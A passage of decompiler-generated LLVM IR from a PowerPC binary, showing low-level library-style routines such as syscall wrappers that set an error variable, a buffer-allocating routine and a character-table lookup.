  store i32 ptrtoint ([6 x i8]* @global_var_1000e29c.196 to i32), i32* @r4, align 4
  %v3_10004980 = call i32 @function_1000770c(i32 %v2_10004898, i32 ptrtoint ([6 x i8]* @global_var_1000e29c.196 to i32))
  %v3_10004988 = icmp eq i32 %v3_10004980, 0
  br i1 %v3_10004988, label %dec_label_pc_100043f4, label %dec_label_pc_10004990

dec_label_pc_10004990:                            ; preds = %dec_label_pc_10004970
  store i32 ptrtoint (i32* @global_var_1000e298.191 to i32), i32* @r4, align 4
  store i32 268454304, i32* @lr, align 4
  %v3_1000499c = call i32 @function_100077ac(i32 0, i32 ptrtoint (i32* @global_var_1000e298.191 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100049ac = icmp eq i32 %v3_1000499c, 0
  br i1 %v3_100049ac, label %dec_label_pc_1000443c, label %dec_label_pc_100049b4

dec_label_pc_100049b4:                            ; preds = %dec_label_pc_10004730, %dec_label_pc_10004990
  %storemerge47.in = phi i32 [ %v3_1000499c, %dec_label_pc_10004990 ], [ %v3_10004754, %dec_label_pc_10004730 ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v2_100049b8 = load i8, i8* %storemerge47, align 1
  %v3_100049c0 = icmp eq i8 %v2_100049b8, 0
  br i1 %v3_100049c0, label %dec_label_pc_1000443c, label %dec_label_pc_10004764

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10004964, { 1, 0 }
  uselistorder i32 %v4_100046e8, { 1, 0 }
  uselistorder i32 %v2_100046d8, { 0, 2, 1 }
  uselistorder i32 %v3_100046c0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004664, { 1, 0 }
  uselistorder i32 %v1_10004630, { 1, 0 }
  uselistorder i32 %storemerge1927, { 1, 0 }
  uselistorder i32 %v0_10004614, { 1, 0 }
  uselistorder i32 %v1_10004560, { 0, 2, 1 }
  uselistorder i32 %v2_1000458093, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1231, { 1, 0 }
  uselistorder i32 %v3_10004484, { 1, 0 }
  uselistorder i32 %storemerge1123, { 1, 0 }
  uselistorder i32 %v2_10004898, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1000443c, { 2, 1, 0 }
  uselistorder i32 %v1_10004350, { 1, 0 }
  uselistorder i32 %v2_10004314, { 1, 0 }
  uselistorder i32 %storemerge1051, { 1, 0 }
  uselistorder i32 %v3_10004264, { 1, 0, 2 }
  uselistorder i32 %v2_100041f0, { 1, 0, 2 }
  uselistorder i32 %v2_100041c8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10004190, { 0, 2, 1 }
  uselistorder i32 %stack_var_-6704.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %stack_var_-6744, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_100100a4.195, { 1, 0 }
  uselistorder i32 (i32)* @function_10000724, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_100077ac, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e298.191 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001048c.14, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* @global_var_10010468.13, { 4, 5, 2, 6, 7, 8, 0, 1, 9, 3, 10, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10004d38, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000041c, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_100007d4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10008850, { 1, 0 }
  uselistorder i32 (i32)* @function_10004d80, { 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10004afc, { 2, 1, 0 }
  uselistorder i8 47, { 1, 0, 2 }
  uselistorder i32* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100049b4, { 1, 0 }
  uselistorder label %dec_label_pc_100048d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004880, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004860, { 1, 0 }
  uselistorder label %dec_label_pc_10004848.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100047d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100047b0, { 1, 0 }
  uselistorder label %dec_label_pc_100046bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000469c, { 1, 0 }
  uselistorder label %dec_label_pc_10004680, { 1, 0 }
  uselistorder label %dec_label_pc_1000462c, { 1, 0 }
  uselistorder label %dec_label_pc_1000456c, { 1, 0 }
  uselistorder label %dec_label_pc_10004524, { 1, 0 }
  uselistorder label %dec_label_pc_10004450, { 1, 0 }
  uselistorder label %dec_label_pc_1000443c, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100043f4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10004300, { 1, 0 }
  uselistorder label %dec_label_pc_100042c4, { 1, 0 }
  uselistorder label %dec_label_pc_100042ac, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000418c, { 1, 0 }
  uselistorder label %dec_label_pc_1000412c, { 1, 0 }
}

define i32 @function_100049cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100049cc:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_100049f0 = icmp eq i32 %arg2, -2143521772
  %v2_100049f4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100049f4, i32* %stack_var_-32, align 4
  br i1 %v4_100049f0, label %dec_label_pc_10004a50, label %dec_label_pc_10004a10

dec_label_pc_10004a10:                            ; preds = %dec_label_pc_100049cc
  %v3_10004a10 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10004a10, label %dec_label_pc_10004a28, label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_10004a10
  %v3_10004a1c = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10004a1c, label %dec_label_pc_10004a44, label %dec_label_pc_10004a70

dec_label_pc_10004a28:                            ; preds = %dec_label_pc_10004a10
  %v1_10004a28 = xor i32 %arg2, -2143551488
  %v3_10004a2c = icmp eq i32 %v1_10004a28, 29717
  br i1 %v3_10004a2c, label %dec_label_pc_10004a60, label %dec_label_pc_10004a34

dec_label_pc_10004a34:                            ; preds = %dec_label_pc_10004a28
  %v3_10004a38 = icmp eq i32 %v1_10004a28, 29718
  br i1 %v3_10004a38, label %dec_label_pc_10004a68, label %dec_label_pc_10004a70

dec_label_pc_10004a44:                            ; preds = %dec_label_pc_10004a18
  store i32 ptrtoint (i32* @global_var_10004a4c.197 to i32), i32* @lr, align 4
  %v1_10004a48 = inttoptr i32 %arg3 to i32*
  %v2_10004a48 = call i32 @function_100077e4(i32* %v1_10004a48)
  br label %dec_label_pc_10004a58

dec_label_pc_10004a50:                            ; preds = %dec_label_pc_100049cc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a54:                            ; preds = %dec_label_pc_10004a68, %dec_label_pc_10004a60, %dec_label_pc_10004a50
  store i32 268454488, i32* @lr, align 4
  %v0_10004a54 = call i32 @function_10007880()
  br label %dec_label_pc_10004a58

dec_label_pc_10004a58:                            ; preds = %dec_label_pc_10004a44, %dec_label_pc_10004a54
  %storemerge = phi i32 [ %v0_10004a54, %dec_label_pc_10004a54 ], [ %v2_10004a48, %dec_label_pc_10004a44 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004a9c

dec_label_pc_10004a60:                            ; preds = %dec_label_pc_10004a28
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a68:                            ; preds = %dec_label_pc_10004a34
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_10004a34, %dec_label_pc_10004a18
  %v0_10004a80 = call i32 @__asm_mfcr()
  %v1_10004a84 = and i32 %v0_10004a80, 268435456
  %v3_10004a84 = icmp eq i32 %v1_10004a84, 0
  store i32 %v0_10004a80, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a84, label %dec_label_pc_10004a9c, label %dec_label_pc_10004a90

dec_label_pc_10004a90:                            ; preds = %dec_label_pc_10004a70
  %v0_10004a90 = call i32 @function_10004e38()
  %v0_10004a94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a94 = inttoptr i32 %v0_10004a90 to i32*
  store i32 %v0_10004a94, i32* %v2_10004a94, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004a9c

dec_label_pc_10004a9c:                            ; preds = %dec_label_pc_10004a70, %dec_label_pc_10004a58, %dec_label_pc_10004a90
  %v0_10004aa0 = phi i32 [ %v0_10004a80, %dec_label_pc_10004a70 ], [ %storemerge, %dec_label_pc_10004a58 ], [ -1, %dec_label_pc_10004a90 ]
  ret i32 %v0_10004aa0

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004a9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a58, { 1, 0 }
}

define i32 @function_10004ab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004ab4:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004acc = call i32 @__asm_mfcr()
  %v1_10004ad0 = and i32 %v0_10004acc, 268435456
  %v3_10004ad0 = icmp eq i32 %v1_10004ad0, 0
  store i32 %v0_10004acc, i32* %r31.global-to-local, align 4
  br i1 %v3_10004ad0, label %dec_label_pc_10004ae8, label %dec_label_pc_10004adc

dec_label_pc_10004adc:                            ; preds = %dec_label_pc_10004ab4
  %v0_10004adc = call i32 @function_10004e38()
  %v0_10004ae0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004ae0 = inttoptr i32 %v0_10004adc to i32*
  store i32 %v0_10004ae0, i32* %v2_10004ae0, align 4
  br label %dec_label_pc_10004ae8

dec_label_pc_10004ae8:                            ; preds = %dec_label_pc_10004ab4, %dec_label_pc_10004adc
  %v0_10004af8 = phi i32 [ %v0_10004acc, %dec_label_pc_10004ab4 ], [ -1, %dec_label_pc_10004adc ]
  ret i32 %v0_10004af8

; uselistorder directives
  uselistorder label %dec_label_pc_10004ae8, { 1, 0 }
}

define i32 @function_10004afc() local_unnamed_addr {
dec_label_pc_10004afc:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004b14 = call i32 @__asm_mfcr()
  %v1_10004b18 = and i32 %v0_10004b14, 268435456
  %v3_10004b18 = icmp eq i32 %v1_10004b18, 0
  store i32 %v0_10004b14, i32* %r31.global-to-local, align 4
  br i1 %v3_10004b18, label %dec_label_pc_10004b30, label %dec_label_pc_10004b24

dec_label_pc_10004b24:                            ; preds = %dec_label_pc_10004afc
  %v0_10004b24 = call i32 @function_10004e38()
  %v0_10004b28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004b28 = inttoptr i32 %v0_10004b24 to i32*
  store i32 %v0_10004b28, i32* %v2_10004b28, align 4
  br label %dec_label_pc_10004b30

dec_label_pc_10004b30:                            ; preds = %dec_label_pc_10004afc, %dec_label_pc_10004b24
  %v0_10004b40 = phi i32 [ %v0_10004b14, %dec_label_pc_10004afc ], [ -1, %dec_label_pc_10004b24 ]
  ret i32 %v0_10004b40

; uselistorder directives
  uselistorder label %dec_label_pc_10004b30, { 1, 0 }
}

define i32 @function_10004b44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004b44:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10004b50 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10004b60 = icmp eq i32 %arg1, 0
  br i1 %v3_10004b50, label %dec_label_pc_10004b60, label %dec_label_pc_10004b94

dec_label_pc_10004b60:                            ; preds = %dec_label_pc_10004b44
  br i1 %v3_10004b60, label %dec_label_pc_10004b7c, label %dec_label_pc_10004b68

dec_label_pc_10004b68:                            ; preds = %dec_label_pc_10004b60
  %v0_10004b68 = call i32 @function_10004e38()
  store i32 0, i32* @r30, align 4
  %v2_10004b74 = inttoptr i32 %v0_10004b68 to i32*
  store i32 22, i32* %v2_10004b74, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004b7c:                            ; preds = %dec_label_pc_10004b60
  store i32 268454784, i32* @lr, align 4
  %v0_10004b7c = call i32 @function_10004c44()
  %v1_10004b80 = icmp slt i32 %v0_10004b7c, 4096
  %v0_10004b84. = select i1 %v1_10004b80, i32 4096, i32 %v0_10004b7c
  store i32 %v0_10004b84., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004ba4

dec_label_pc_10004b94:                            ; preds = %dec_label_pc_10004b44
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10004b60, label %dec_label_pc_10004ba4, label %dec_label_pc_10004bb4

dec_label_pc_10004ba4:                            ; preds = %dec_label_pc_10004b7c, %dec_label_pc_10004b94
  %v0_10004ba4 = phi i32 [ %v0_10004b84., %dec_label_pc_10004b7c ], [ %arg2, %dec_label_pc_10004b94 ]
  store i32 %v0_10004ba4, i32* @r3, align 4
  store i32 268454828, i32* @lr, align 4
  %v0_10004ba8 = call i32 @function_1000809c()
  store i32 %v0_10004ba8, i32* @r29, align 4
  %v3_10004bac = icmp eq i32 %v0_10004ba8, 0
  br i1 %v3_10004bac, label %dec_label_pc_10004c28, label %dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge

dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge: ; preds = %dec_label_pc_10004ba4
  br label %dec_label_pc_10004bb4

dec_label_pc_10004bb4:                            ; preds = %dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge, %dec_label_pc_10004b94
  %v0_10004bc4 = call i32 @__asm_mfcr()
  %v1_10004bc8 = and i32 %v0_10004bc4, 268435456
  %v3_10004bc8 = icmp eq i32 %v1_10004bc8, 0
  store i32 %v0_10004bc4, i32* %r31.global-to-local, align 4
  store i32 %v0_10004bc4, i32* @r4, align 4
  br i1 %v3_10004bc8, label %dec_label_pc_10004be4, label %dec_label_pc_10004bd8

dec_label_pc_10004bd8:                            ; preds = %dec_label_pc_10004bb4
  %v0_10004bd8 = call i32 @function_10004e38()
  store i32 -1, i32* @r4, align 4
  %v0_10004be0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004be0 = inttoptr i32 %v0_10004bd8 to i32*
  store i32 %v0_10004be0, i32* %v2_10004be0, align 4
  %v0_10004be4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004be4

dec_label_pc_10004be4:                            ; preds = %dec_label_pc_10004bb4, %dec_label_pc_10004bd8
  %v0_10004be4 = phi i32 [ %v0_10004bc4, %dec_label_pc_10004bb4 ], [ %v0_10004be4.pre, %dec_label_pc_10004bd8 ]
  %v1_10004be4 = icmp slt i32 %v0_10004be4, 0
  %v0_10004be8 = load i32, i32* @r30, align 4
  %v3_10004be8 = icmp eq i32 %v0_10004be8, 0
  br i1 %v1_10004be4, label %dec_label_pc_10004c18, label %dec_label_pc_10004bf0

dec_label_pc_10004bf0:                            ; preds = %dec_label_pc_10004be4
  br i1 %v3_10004be8, label %dec_label_pc_10004bf4, label %dec_label_pc_10004c08.thread8

dec_label_pc_10004c08.thread8:                    ; preds = %dec_label_pc_10004bf0
  br label %dec_label_pc_10004c2c

dec_label_pc_10004bf4:                            ; preds = %dec_label_pc_10004bf0
  %v0_10004bf4 = load i32, i32* @r28, align 4
  %v3_10004bf4 = icmp eq i32 %v0_10004bf4, 0
  br i1 %v3_10004bf4, label %dec_label_pc_10004c08, label %dec_label_pc_10004c08.thread

dec_label_pc_10004c08.thread:                     ; preds = %dec_label_pc_10004bf4
  br label %dec_label_pc_10004c10

dec_label_pc_10004c08:                            ; preds = %dec_label_pc_10004bf4
  %v0_10004bfc = load i32, i32* @r29, align 4
  store i32 268454916, i32* @lr, align 4
  %v1_10004c00 = call i32 @function_100082f4(i32 %v0_10004bfc)
  store i32 %v1_10004c00, i32* @r30, align 4
  %v3_10004c08 = icmp eq i32 %v1_10004c00, 0
  br i1 %v3_10004c08, label %dec_label_pc_10004c10, label %dec_label_pc_10004c2c

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004c08.thread, %dec_label_pc_10004c08
  %v0_10004c10 = load i32, i32* @r29, align 4
  store i32 %v0_10004c10, i32* @r30, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c18:                            ; preds = %dec_label_pc_10004be4
  br i1 %v3_10004be8, label %dec_label_pc_10004c1c, label %dec_label_pc_10004c28

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c18
  %v0_10004c1c = load i32, i32* @r29, align 4
  store i32 %v0_10004c1c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c24.198 to i32), i32* @lr, align 4
  %v0_10004c20 = call i32 @function_100081f4()
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c28:                            ; preds = %dec_label_pc_10004c18, %dec_label_pc_10004ba4
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c2c:                            ; preds = %dec_label_pc_10004c08.thread8, %dec_label_pc_10004c08, %dec_label_pc_10004c1c, %dec_label_pc_10004c10, %dec_label_pc_10004b68, %dec_label_pc_10004c28
  %v0_10004c30 = load i32, i32* @r30, align 4
  ret i32 %v0_10004c30

; uselistorder directives
  uselistorder i32 %v0_10004bc4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10004c2c, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
  uselistorder label %dec_label_pc_10004be4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba4, { 1, 0 }
}

define i32 @function_10004c44() local_unnamed_addr {
dec_label_pc_10004c44:
  %v3_10004c4c = load i32, i32* @global_var_100104ac.199, align 4
  %v3_10004c50 = icmp eq i32 %v3_10004c4c, 0
  %v0_10004c54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004c50, i32 %v0_10004c54)
  ret i32 %v3_10004c4c
}

define i32 @function_10004c60() local_unnamed_addr {
dec_label_pc_10004c60:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004c78 = call i32 @__asm_mfcr()
  %v1_10004c7c = and i32 %v0_10004c78, 268435456
  %v3_10004c7c = icmp eq i32 %v1_10004c7c, 0
  store i32 %v0_10004c78, i32* %r31.global-to-local, align 4
  br i1 %v3_10004c7c, label %dec_label_pc_10004c94, label %dec_label_pc_10004c88

dec_label_pc_10004c88:                            ; preds = %dec_label_pc_10004c60
  %v0_10004c88 = call i32 @function_10004e38()
  %v0_10004c8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004c8c = inttoptr i32 %v0_10004c88 to i32*
  store i32 %v0_10004c8c, i32* %v2_10004c8c, align 4
  br label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c60, %dec_label_pc_10004c88
  %v0_10004ca4 = phi i32 [ %v0_10004c78, %dec_label_pc_10004c60 ], [ -1, %dec_label_pc_10004c88 ]
  ret i32 %v0_10004ca4

; uselistorder directives
  uselistorder label %dec_label_pc_10004c94, { 1, 0 }
}

define i32 @function_10004ca8() local_unnamed_addr {
dec_label_pc_10004ca8:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004cc0 = call i32 @__asm_mfcr()
  %v1_10004cc4 = and i32 %v0_10004cc0, 268435456
  %v3_10004cc4 = icmp eq i32 %v1_10004cc4, 0
  store i32 %v0_10004cc0, i32* %r31.global-to-local, align 4
  br i1 %v3_10004cc4, label %dec_label_pc_10004cdc, label %dec_label_pc_10004cd0

dec_label_pc_10004cd0:                            ; preds = %dec_label_pc_10004ca8
  %v0_10004cd0 = call i32 @function_10004e38()
  %v0_10004cd4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004cd4 = inttoptr i32 %v0_10004cd0 to i32*
  store i32 %v0_10004cd4, i32* %v2_10004cd4, align 4
  br label %dec_label_pc_10004cdc

dec_label_pc_10004cdc:                            ; preds = %dec_label_pc_10004ca8, %dec_label_pc_10004cd0
  %v0_10004cec = phi i32 [ %v0_10004cc0, %dec_label_pc_10004ca8 ], [ -1, %dec_label_pc_10004cd0 ]
  ret i32 %v0_10004cec

; uselistorder directives
  uselistorder label %dec_label_pc_10004cdc, { 1, 0 }
}

define i32 @function_10004cf0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004cf0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d08 = call i32 @__asm_mfcr()
  %v1_10004d0c = and i32 %v0_10004d08, 268435456
  %v3_10004d0c = icmp eq i32 %v1_10004d0c, 0
  store i32 %v0_10004d08, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d0c, label %dec_label_pc_10004d24, label %dec_label_pc_10004d18

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004cf0
  %v0_10004d18 = call i32 @function_10004e38()
  %v0_10004d1c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004d1c = inttoptr i32 %v0_10004d18 to i32*
  store i32 %v0_10004d1c, i32* %v2_10004d1c, align 4
  br label %dec_label_pc_10004d24

dec_label_pc_10004d24:                            ; preds = %dec_label_pc_10004cf0, %dec_label_pc_10004d18
  %v0_10004d34 = phi i32 [ %v0_10004d08, %dec_label_pc_10004cf0 ], [ -1, %dec_label_pc_10004d18 ]
  ret i32 %v0_10004d34

; uselistorder directives
  uselistorder label %dec_label_pc_10004d24, { 1, 0 }
}

define i32 @function_10004d38(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10004d38:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d50 = call i32 @__asm_mfcr()
  %v1_10004d54 = and i32 %v0_10004d50, 268435456
  %v3_10004d54 = icmp eq i32 %v1_10004d54, 0
  store i32 %v0_10004d50, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d54, label %dec_label_pc_10004d6c, label %dec_label_pc_10004d60

dec_label_pc_10004d60:                            ; preds = %dec_label_pc_10004d38
  %v0_10004d60 = call i32 @function_10004e38()
  %v0_10004d64 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004d64 = inttoptr i32 %v0_10004d60 to i32*
  store i32 %v0_10004d64, i32* %v2_10004d64, align 4
  br label %dec_label_pc_10004d6c

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d38, %dec_label_pc_10004d60
  %v0_10004d7c = phi i32 [ %v0_10004d50, %dec_label_pc_10004d38 ], [ -1, %dec_label_pc_10004d60 ]
  ret i32 %v0_10004d7c

; uselistorder directives
  uselistorder label %dec_label_pc_10004d6c, { 1, 0 }
}

define i32 @function_10004d80(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004d80:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d98 = call i32 @__asm_mfcr()
  %v1_10004d9c = and i32 %v0_10004d98, 268435456
  %v3_10004d9c = icmp eq i32 %v1_10004d9c, 0
  store i32 %v0_10004d98, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d9c, label %dec_label_pc_10004db4, label %dec_label_pc_10004da8

dec_label_pc_10004da8:                            ; preds = %dec_label_pc_10004d80
  %v0_10004da8 = call i32 @function_10004e38()
  %v0_10004dac = load i32, i32* %r31.global-to-local, align 4
  %v2_10004dac = inttoptr i32 %v0_10004da8 to i32*
  store i32 %v0_10004dac, i32* %v2_10004dac, align 4
  br label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d80, %dec_label_pc_10004da8
  %v0_10004dc4 = phi i32 [ %v0_10004d98, %dec_label_pc_10004d80 ], [ -1, %dec_label_pc_10004da8 ]
  ret i32 %v0_10004dc4

; uselistorder directives
  uselistorder label %dec_label_pc_10004db4, { 1, 0 }
}

define i32 @function_10004dc8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004dc8:
  %v1_10004dcc = call i32 @function_10009a80(i32 0)
  ret i32 %v1_10004dcc
}

define i32 @function_10004dd0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004dd0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004de8 = call i32 @__asm_mfcr()
  %v1_10004dec = and i32 %v0_10004de8, 268435456
  %v3_10004dec = icmp eq i32 %v1_10004dec, 0
  store i32 %v0_10004de8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004dec, label %dec_label_pc_10004e04, label %dec_label_pc_10004df8

dec_label_pc_10004df8:                            ; preds = %dec_label_pc_10004dd0
  %v0_10004df8 = call i32 @function_10004e38()
  %v0_10004dfc = load i32, i32* %r31.global-to-local, align 4
  %v2_10004dfc = inttoptr i32 %v0_10004df8 to i32*
  store i32 %v0_10004dfc, i32* %v2_10004dfc, align 4
  br label %dec_label_pc_10004e04

dec_label_pc_10004e04:                            ; preds = %dec_label_pc_10004dd0, %dec_label_pc_10004df8
  %v0_10004e14 = phi i32 [ %v0_10004de8, %dec_label_pc_10004dd0 ], [ -1, %dec_label_pc_10004df8 ]
  ret i32 %v0_10004e14

; uselistorder directives
  uselistorder label %dec_label_pc_10004e04, { 1, 0 }
}

define i32 @function_10004e18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004e18:
  %v1_10004e18 = add i32 %arg1, 128
  %v1_10004e1c = mul i32 %arg1, 2
  %v2_10004e20 = icmp ugt i32 %v1_10004e18, 383
  %v0_10004e24 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10004e20, i32 %v0_10004e24)
  %v3_10004e2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1056) to i32*), align 4
  %v2_10004e30 = add i32 %v1_10004e1c, %v3_10004e2c
  %v3_10004e30 = inttoptr i32 %v2_10004e30 to i16*
  %v4_10004e30 = load i16, i16* %v3_10004e30, align 2
  %v5_10004e30 = sext i16 %v4_10004e30 to i32
  ret i32 %v5_10004e30
}

define i32 @function_10004e38() local_unnamed_addr {
dec_label_pc_10004e38:
  ret i32 ptrtoint (i32* @global_var_100104bc.204 to i32)
}

define i32 @function_10004e44(i16* %arg1) local_unnamed_addr {
dec_label_pc_10004e44:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10004e58 = add i32 %tmp, 52
  %v3_10004e58 = inttoptr i32 %v2_10004e58 to i32*
  %v4_10004e58 = load i32, i32* %v3_10004e58, align 4
  store i32 %v4_10004e58, i32* @r28, align 4
  %v3_10004e5c = icmp eq i32 %v4_10004e58, 0
  store i1 %v3_10004e5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004e5c, label %dec_label_pc_10004e64, label %dec_label_pc_10004e84

dec_label_pc_10004e64:                            ; preds = %dec_label_pc_10004e44
  %v2_10004e6c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004e6c, i32* @r3, align 4
  %v0_10004e78 = call i32 @function_100091fc()
  %v0_10004e80 = call i32 @function_100091f4()
  %v0_10004e84.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004e84

dec_label_pc_10004e84:                            ; preds = %dec_label_pc_10004e44, %dec_label_pc_10004e64
  %v0_10004e94 = phi i32 [ %tmp, %dec_label_pc_10004e44 ], [ %v0_10004e84.pre, %dec_label_pc_10004e64 ]
  %v1_10004e84 = inttoptr i32 %v0_10004e94 to i16*
  %v2_10004e84 = load i16, i16* %v1_10004e84, align 2
  %v3_10004e84 = zext i16 %v2_10004e84 to i32
  store i32 0, i32* @r27, align 4
  %v1_10004e8c = and i32 %v3_10004e84, 64
  %v3_10004e8c = icmp eq i32 %v1_10004e8c, 0
  br i1 %v3_10004e8c, label %dec_label_pc_10004ea0, label %dec_label_pc_10004e94

dec_label_pc_10004e94:                            ; preds = %dec_label_pc_10004e84
  store i32 268455580, i32* @lr, align 4
  %v4_10004e98 = call i32 @function_10006c58(i16* %v1_10004e84, i32 %v1_10004e8c)
  store i32 %v4_10004e98, i32* @r27, align 4
  %v0_10004ea0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004ea0

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e84, %dec_label_pc_10004e94
  %v0_10004ea0 = phi i32 [ %v0_10004e94, %dec_label_pc_10004e84 ], [ %v0_10004ea0.pre, %dec_label_pc_10004e94 ]
  %v1_10004ea0 = add i32 %v0_10004ea0, 4
  %v2_10004ea0 = inttoptr i32 %v1_10004ea0 to i32*
  %v3_10004ea0 = load i32, i32* %v2_10004ea0, align 4
